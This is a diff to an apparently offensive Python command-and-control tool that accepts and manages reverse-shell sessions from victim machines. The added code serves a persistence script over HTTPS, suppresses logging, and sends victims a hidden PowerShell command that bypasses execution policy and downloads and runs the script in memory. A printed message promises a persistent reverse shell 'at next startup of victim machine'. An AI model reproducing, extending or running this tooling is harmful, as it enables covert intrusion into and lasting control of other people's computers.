@@ -3,7 +3,6 @@ import subprocess
 import sys
 import time
 import threading
-import asyncio
 import io
 import os
 import colorama
@@ -20,9 +19,10 @@ import requests
 import os
 import tempfile
 from http.server import HTTPServer, SimpleHTTPRequestHandler
-from ssl import wrap_socket, PROTOCOL_TLSv1_2
 
-# List of ASCII art banners
+from ssl import SSLContext, PROTOCOL_TLS
+import ssl
+
 banners = [
     '''
       (;)
@@ -260,16 +260,22 @@ def start_https_server():
             def do_GET(self):
                 SimpleHTTPRequestHandler.do_GET(self)
 
-        SERVER = HTTPServer((LISTEN_IP, LISTEN_PORT), BasicAuthHandler)
-        SERVER.socket = wrap_socket(SERVER.socket, server_side=True, certfile=cert_file, keyfile=key_file, ssl_version=PROTOCOL_TLSv1_2)
+            # Suppress log messages
+            def log_message(self, format, *args):
+                return
 
+        context = SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain(certfile=cert_file, keyfile=key_file)
+
+        SERVER = HTTPServer((LISTEN_IP, LISTEN_PORT), BasicAuthHandler)
+        SERVER.socket = context.wrap_socket(SERVER.socket, server_side=True)        
         print(f'Serving HTTPS on {LISTEN_IP} port {LISTEN_PORT} ...')
 
         try:
             SERVER.serve_forever()
         except KeyboardInterrupt:
             pass
-         
+        sys.stderr = open(os.devnull, 'w') 
         # Clean up
         os.system(f'shred {key_file} || true')
 
@@ -281,7 +287,8 @@ def persist_shell(conn, addr, shell_id):
     # Replace the server address and port
     ps_script = ps_script.replace('server_address', get_my_ip())
     ps_script = ps_script.replace('port_number', '5555')
-    save = open('persist.ps1', 'w')
+    with open('persist.ps1', 'w') as save:
+        save.write(ps_script)
     url = f"https://{get_my_ip()}:8443/persist.ps1"
     # Convert the script to a base64 string
     command = f'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "iex ((iwr -Uri {url}).Content)"'
@@ -290,7 +297,9 @@ def persist_shell(conn, addr, shell_id):
     print("\033[91m[*] Executing Keres in memory ..... \033[0m")
     # Execute the command on shell 
     conn.send(command.encode())
-    print(f"[*] Persisted shell {shell_id} from IP {addr}")
+    time.sleep(2)
+    print(f"[*] Persisted rev-shell {shell_id} from IP {addr}")
+    print("\033[91m[*] you will get a persistant powershell rev-shell at next startup of victim machine ;) \033[0m")
 def upgrade_shell(conn,addr, shell_id):
     # Start HTTP server in a new thread
 
@@ -346,16 +355,22 @@ def handle_client(conn, addr):
         read_sockets, _, _ = select.select([conn, sys.stdin], [], [], 1)
 
         for sock in read_sockets:
-            if sock == conn:
-                data = conn.recv(1024)
-                if not data:
-                    print("Connection closed by the client")
-                    return
-                print(data.decode(), end="")
-            else:
-                mycmd = input()
-                mycmd = mycmd + "\n"
-                conn.send(mycmd.encode())
+            try:
+                if sock == conn:
+                    data = conn.recv(1024)
+                    if not data:
+                        print("\033[91mconnection to " + addr[0] + " lost\033[0m")
+                        remove_connection(conn)
+                        break
+                    print(data.decode(), end="")
+                else:
+                    mycmd = input()
+                    mycmd = mycmd + "\n"
+                    conn.send(mycmd.encode())
+            except ConnectionError:
+                print("\033[91mconnection to " + addr[0] + " lost\033[0m")
+                remove_connection(conn)
+                break
 
 print(Fore.YELLOW + "[+] Your local IP : "+get_my_ip(), Fore.WHITE)
 print(Fore.YELLOW + "[+] Your public IP : "+requests.get('https://api.ipify.org').text, Fore.WHITE)
@@ -371,7 +386,7 @@ def remove_connection(conn):
     global connections
     connections = [(c, addr) for c, addr in connections if c != conn]
 
-non_daemon_threads = []
+
 
 
 def accept_connections():
@@ -380,9 +395,9 @@ def accept_connections():
         ip_connections = [connection for connection in connections if connection[1][0] == addr[0]]
         if len(ip_connections) < 3:
             connections.append((conn, addr))
-            print(Fore.GREEN + '\n[*] Accepted new connection from: ' + Fore.YELLOW + f'{addr[0]}' + Fore.GREEN + f':{addr[1]}' + Fore.WHITE)
+            print(Fore.GREEN + '\n\033[94m[*] Accepted new connection from: \033 ' + Fore.YELLOW + f'{addr[0]}' + Fore.GREEN + f':{addr[1]}' + Fore.WHITE)
         else:
-            print(Fore.RED + '\n[*] Connection limit reached for: ' + Fore.YELLOW + f'{addr[0]}' + Fore.RED + Fore.WHITE)
+            #print(Fore.RED + '\n[*] Connection limit reached for: ' + Fore.YELLOW + f'{addr[0]}' + Fore.RED + Fore.WHITE)
             conn.close()
 # Create a new thread that will run the accept_connections function
 accept_thread = threading.Thread(target=accept_connections)
@@ -399,6 +414,9 @@ first_press_time = None
 http_server_thread = threading.Thread(target=start_http_server)
 http_server_thread.daemon = True
 http_server_thread.start()
+https_server_thread = threading.Thread(target=start_https_server)
+https_server_thread.daemon = True
+https_server_thread.start()
 ctrl_c_count = 0
 session_started = False
 while True:
@@ -443,9 +461,9 @@ while True:
                     conn, addr = connections[session]  # Get the shell ID from the command
                     exec_shell(conn, addr, shell_id, url,type)     
                 if command == 'list':
-                    print("\nAvailable sessions:")
+                    print("\nAvailable rev-shell sessions:")
                     for i, connection in enumerate(connections):
-                        print(f"{i+1}. {connection[1][0]}:{connection[1][1]}")
+                        print(f"\033[91m{i+1}. {connection[1][0]}:{connection[1][1]}\033[0m")
                     break
                 elif command.startswith('session '):
                     try:
@@ -458,7 +476,7 @@ while True:
                             while session_started==True:
                                 handle_client(conn,addr)
                         except KeyboardInterrupt:
-                            print("Session interrupted. Returning to menu.")
+                            print("Session Paused. Returning to menu.")
                             session_started = False
                             break
                     except ValueError:
